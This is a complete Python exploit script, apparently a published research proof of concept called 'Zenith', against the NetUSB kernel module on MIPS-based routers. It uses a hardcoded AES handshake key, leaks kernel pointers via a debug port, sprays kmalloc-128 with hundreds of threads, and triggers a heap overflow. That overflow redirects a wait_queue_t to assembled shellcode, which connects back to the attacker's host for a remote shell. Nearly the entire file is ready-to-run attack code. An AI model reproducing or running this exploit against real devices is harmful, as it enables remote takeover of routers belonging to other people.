# Axel '0vercl0k' Souchet - September 17 2021
# Requires:
#   - apt install binutils-mips-linux-gnu for mips-linux-gnu-as, mips-linux-gnu-ld,
#   - apt install binutils for readelf
#   - pip3 install pycrypto for Crypto.Cipher.AES
from Crypto.Cipher import AES
import socket
import struct
import argparse
import time
import threading
import re
import os
import curses
import sys

le8 = lambda i: struct.pack('=B', i)
le32 = lambda i: struct.pack('<I', i)
be32 = lambda i: struct.pack('>I', i)

telnet_port = 33344
netusb_port = 20005
timeout = 0.3
# (gdb) x/10dwx 0xffffffff8522a000
# 0x8522a000:     0xff510000      0x1000ffff      0xffff4433      0x22110000
# 0x8522a010:     0x0000000d      0x0000000d      0x0000000d      0x0000000d
# 0x8522a020:     0x0000000d      0x0000000d
addr_payload = 0x83c00000 + 0x10

new_connection_re = re.compile(rb'INFO162F: new connection from ', re.IGNORECASE)
new_tunnel_re = re.compile(rb'INFO1F47: new tunnel : remote id = (.+), length = ', re.IGNORECASE)
new_sbus_re = re.compile(rb'INFO14B0:  new connection sbus ([a-f0-9]+)', re.IGNORECASE)

def log_center(stdscr, y, txt, attr = 0):
    '''Write |txt| in the center of the screen.'''
    x = (curses.COLS // 2) - (len(txt) // 2)
    pad = ' ' * (curses.COLS - 1)
    stdscr.addstr(y, 0, pad, attr)
    stdscr.addstr(y, x, txt, attr)
    stdscr.refresh()

def send_handshake(s, aes_ctx):
    '''Send the handshake to the socket.'''
    # Version
    s.send(b'\x56\x04')
    # Send random data
    s.send(aes_ctx.encrypt(b'a' * 16))
    _ = s.recv(16)

    # Receive & send back the random numbers.
    challenge = s.recv(16)
    s.send(aes_ctx.encrypt(challenge))

def send_bus_name(s, name):
    '''Send the bus name to the socket.'''
    length = len(name)
    assert length - 1 < 63
    s.send(le32(length))
    b = name
    if type(name) == str:
        b = bytes(name, 'ascii')
    s.send(b)

def create_connection(target, port, name):
    '''Create a connection: handshake & bus name.'''
    # first_aes_k = bytes.fromhex('a2353556541cfe44ec468248064de66c')
    # aes_ctx = AES.new(first_aes_k, AES.MODE_ECB)
    # second_aes_k = aes_ctx.decrypt(encrypted_second_aes_k)
    second_aes_k = bytes.fromhex('5c130b59d26242649ed488382d5eaecc')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    aes_ctx = AES.new(second_aes_k, AES.MODE_ECB)
    send_handshake(s, aes_ctx)
    send_bus_name(s, name)
    return s, aes_ctx

class Leaker():
    '''This uses the 'kdbg' feature of NetUSB. It basically
    sends back to a socket |printk| like debugging information
    where they leak object pointers, etc.'''
    def __init__(self, target):
        self.target = target
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.target, telnet_port))

    def wait_for_one(self, rx = None):
        name, addr = None, None
        while True:
            line = self.s.recv(128)
            if line == b'\x00\x00\x00\x00':
                continue

            if rx is not None:
                m = rx.search(line)
                if m is None:
                    continue
                return None

            m = new_sbus_re.search(line)
            if not m:
                continue
            addr = m.group(1)
            return int(addr, 16)

class SprayerThread(threading.Thread):
    '''This is a thread that keeps alive a connection by
    sending content regularly on the socket to prevent it
    from timing out.'''
    def __init__(self, target, name):
        threading.Thread.__init__(self, name = name)
        self.target = target
        self.port = netusb_port
        self.bus_id = name
        self.stop_event = threading.Event()
        self.ready_event = threading.Event()
        self.addr = None
        self.spray_content = b''
        self.length = 0x1000

    def set_spray_content(self, spray_content):
        assert type(spray_content) == bytes
        self.spray_content = spray_content

    def set_length(self, length):
        self.length = length

    def set_bus_id(self, bus_id):
        assert type(bus_id) == bytes
        self.bus_id = bus_id

    def set_addr(self, addr):
        self.addr = addr

    def stop(self):
        self.stop_event.set()

    def wait_until_ready(self):
        self.ready_event.wait()

    def run(self):
        s, aes_ctx = create_connection(self.target, self.port, self.bus_id)
        # Send host command / opcode
        s.send(le8(0xff))
        s.send(le8(0x51))

        # Send length
        assert len(self.spray_content) < (0x1_000 - 0x100)
        s.send(le32(self.length))
        # Send A & B
        s.send(le32(0xff_ff_ff_ff))
        s.send(le32(0x11_22_33_44))
        # Send spray content
        if self.spray_content is not None:
            s.send(self.spray_content)
        self.ready_event.set()
        # Send bytes one by one and stall in between.
        while True:
            s.send(le8(0xef))
            # Timeout is 15s
            break_needed = False
            for _ in range(13):
                if self.stop_event.is_set():
                    break_needed = True
                    break
                time.sleep(1)
            if break_needed:
                break

        s.close()

class TrasherThread(threading.Thread):
    '''This is the thread that triggers the heap-based overflow.'''
    def __init__(self, target):
        threading.Thread.__init__(self, name = 'trasher')
        self.target = target
        self.port = netusb_port
        self.overflow_event = threading.Event()
        self.overflow_done_event = threading.Event()
        self.overflow_content = None

    def overflow_and_wait(self, overflow_content):
      self.overflow_content = overflow_content
      self.overflow_event.set()
      self.overflow_done_event.wait()

    def run(self):
        s, aes_ctx = create_connection(self.target, self.port, self.name)
        # Send host command / opcode.
        s.send(le8(0xff))
        s.send(le8(0x51))
        # send length
        s.send(le32(0xff_ff_ff_ff))
        # Send A & B
        s.send(le32(0x11_22_33_44))
        self.overflow_event.wait()
        s.send(le32(0x55_66_77_88))
        # Send it.
        # First fill up our buffer.
        p = le8(0xaa) * (128 - 0x10)
        # Fill up overflow
        p += self.overflow_content
        s.send(p)
        self.overflow_done_event.set()
        s.close()

class VictimThread(threading.Thread):
    def __init__(self, target, name = 'victim'):
        threading.Thread.__init__(self, name = name)
        self.target = target
        self.port = netusb_port

    def run(self):
        s, aes_ctx = create_connection(self.target, self.port, self.name)
        # Send host command.
        s.send(le8(0xc))
        # Send payload
        s.send(le8(0xa1) * 17)
        x = s.recv(19)

def read_payload(name):
    '''Dump the shellcode bytes off the |readelf| output.'''
    r = re.compile(
        ' ([a-f0-9]{8}) ([a-f0-9]{8}) ([a-f0-9]{8}) ([a-f0-9]{8}) ',
        re.IGNORECASE
    )
    p = b''
    with open(name, 'r') as f:
        for line in f.readlines():
            m = r.search(line)
            if not m: continue
            for idx in range(4):
                p += be32(int(m.group(idx + 1), 16))
    return p

def prepare_payload(name, ip_local):
    '''Read the payload pattern, assemble it and dump the assembled bytes.'''
    # Replace the local ip address in the payload
    r = open(name, 'r').read()
    tmp_payload = 'tmp.asm'
    with open(tmp_payload, 'w') as f:
        f.write(r.format(ip_local = ip_local))

    # Compile the payload
    os.system(f'mips-linux-gnu-as -march=mips32r2 {tmp_payload} -o sh.o')
    os.system(f'mips-linux-gnu-ld --omagic --section-start=.text={hex(addr_payload)} sh.o -o sh')

    # Dump the payload
    os.system('readelf -x .text sh > payload.txt')

    # Read the payload
    payload = read_payload('payload.txt',)

    # Clean-up the payload
    os.system(f'rm sh.o sh {tmp_payload} payload.txt')

    # Fix ip in pwn.sh.
    if os.path.isfile('pwn.sh'):
        os.remove('pwn.sh')

    r = open('pwn_base.sh', 'r').read()
    with open('pwn.sh', 'w') as f:
        f.write(r.format(ip_local = ip_local))

    return payload

def splash_screen(stdscr):
    '''Setup the splash-screen with ncurses.'''
    zenith = r'''     ___     z     ___     z     ___     z           z   ___     z     ___     
    /\  \    z    /\  \    z    /\__\    z     ___   z  /\  \    z    /\__\    
    \:\  \   z   /::\  \   z   /::|  |   z    /\  \  z  \:\  \   z   /:/  /    
     \:\  \  z  /:/\:\  \  z  /:|:|  |   z    \:\  \ z   \:\  \  z  /:/__/     
      \:\  \ z /::\~\:\  \ z /:/|:|  |__ z    /::\__\z   /::\  \ z /::\  \ ___ 
_______\:\__\z/:/\:\ \:\__\z/:/ |:| /\__\z __/:/\/__/z  /:/\:\__\z/:/\:\  /\__\
\::::::::/__/z\:\~\:\ \/__/z\/__|:|/:/  /z/\/:/  /   z /:/  \/__/z\/__\:\/:/  /
 \:\~~\~~    z \:\ \:\__\  z    |:/:/  / z\::/__/    z/:/  /     z     \::/  / 
  \:\  \     z  \:\ \/__/  z    |::/  /  z \:\__\    z\/__/      z     /:/  /  
   \:\__\    z   \:\__\    z    /:/  /   z  \/__/    z           z    /:/  /   
    \/__/    z    \/__/    z    \/__/    z           z           z    \/__/    '''
    # Initialize the colors for each letter.
    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_WHITE, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_WHITE, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_WHITE, curses.COLOR_BLACK)
    curses.init_pair(5, curses.COLOR_WHITE, curses.COLOR_BLACK)
    curses.init_pair(6, curses.COLOR_RED, curses.COLOR_BLACK)
    y = 0
    w = curses.COLS
    offset = 2
    max_y = y
    # Go through every letters, offset them, color them.
    for line in zenith.splitlines():
        chunks = line.split('z')
        x = (w // 2) - (sum(map(len, chunks)) // 2)
        for chunk_idx, chunk in enumerate(chunks):
            if (chunk_idx % 2) == 0:
                y += offset

            max_y = max(y, max_y)
            color = curses.color_pair(chunk_idx + 1)
            stdscr.addstr(y, x, chunk, color | curses.A_BOLD)
            x += len(chunk)
            if (chunk_idx % 2) == 0:
                y -= offset

        y += 1

    pieces = [
        ("By Axel '", curses.color_pair(2)),
        ('0vercl0k', curses.color_pair(1)),
        ("' Souchet", curses.color_pair(2)),
        ('\n', None),
        ('   > ', curses.color_pair(1)),
        ('doar-e.github.io', curses.color_pair(2)),
        (' <', curses.color_pair(1))
    ]
    y = max_y + 2
    x = w // 2
    init_x = x
    for txt, attr in pieces:
        if txt == '\n':
            y += 1
            x = init_x
            continue
        stdscr.addstr(y, x, txt, attr)
        x += len(txt)
    stdscr.refresh()
    return y + 3

def main(stdscr):
    parser = argparse.ArgumentParser('Zenith exploit')
    parser.add_argument('--target', required = True)
    parser.add_argument('--local', required = True)
    args = parser.parse_args()

    # Display splash-screen and configure the |log| function.
    y = splash_screen(stdscr)
    log = lambda txt: log_center(stdscr, y, txt)

    # Create the leaker.
    leaker = Leaker(args.target)
    sprayers = []

    # Prepare the payload.
    payload = prepare_payload('sh.remote.asm', args.local)
    assert 0 < len(payload) < 0x1_000

    # Let's get to business.
    _3mb = 3 * 1_024 * 1_024
    payload_sprayer = SprayerThread(args.target, 'payload sprayer')
    payload_sprayer.set_length(_3mb)
    payload_sprayer.set_spray_content(payload)
    payload_sprayer.start()
    leaker.wait_for_one()
    sprayers.append(payload_sprayer)
    log(f'Payload placed @ {hex(addr_payload)}')
    y += 1

    # Place the |wait_queue_t|.
    sbus_to_bus_id_offset = 0x241
    wait_queue_t_bus_id = be32(0xaa_aa_aa_aa) + be32(0xbb_bb_bb_bb) + be32(addr_payload) + be32(0) + be32(0xbaadc0de) + be32(0x11223344)
    wait_queue_t = SprayerThread(args.target, 'wait_queue_t')
    wait_queue_t.set_bus_id(wait_queue_t_bus_id)
    wait_queue_t.start()
    wait_queue_t_addr = leaker.wait_for_one() + sbus_to_bus_id_offset
    sprayers.append(wait_queue_t)
    log(f'wait_queue_t @ {hex(wait_queue_t_addr)}')
    y += 1

    # Defragment kmalloc-128 (32 objects per slab cache).
    log('Defragmenting kmalloc128')
    for i in range(311):
        name = f'sprayer {i}'
        sprayer = SprayerThread(args.target, name)
        sprayer.start()
        addr = leaker.wait_for_one()
        sprayer.wait_until_ready()
        sprayer.set_addr(addr)
        sprayers.append(sprayer)
        log(f'Starting {name}..')

    # Place the trasher.
    log('Placing the trasher..')
    trasher = TrasherThread(args.target)
    trasher.start()
    leaker.wait_for_one()
    time.sleep(timeout)

    # Hardcore hax, lol.
    overflow_payload = b''
    overflow_payload += be32(wait_queue_t_addr + 12) + le8(0x11) * 124
    overflow_payload += be32(wait_queue_t_addr + 12) + le8(0x22) * 124
    overflow_payload += be32(wait_queue_t_addr + 12) + le8(0x33) * 124
    overflow_payload += be32(wait_queue_t_addr + 12) + le8(0x44) * 124
    overflow_payload += be32(wait_queue_t_addr + 12) + le8(0x55) * 124
    assert (len(overflow_payload) % 128) == 0

    log('Placing the victim..')
    victim = VictimThread(args.target)
    victim.start()
    leaker.wait_for_one(new_connection_re)

    log('Triggering the overflow..')
    time.sleep(0)
    trasher.overflow_and_wait(overflow_payload)
    time.sleep(10)

    t = SprayerThread(args.target, 'wakey wakey')
    t.start()

    log('Taking a 1.30m nap before exiting..')
    time.sleep(90)
    os.system(f'kill -9 {os.getpid()}')
    sys.exit(0)

try:
    curses.wrapper(main)
except TimeoutError:
    print('Timeout error, killing the exploit.')
    sys.exit(0)
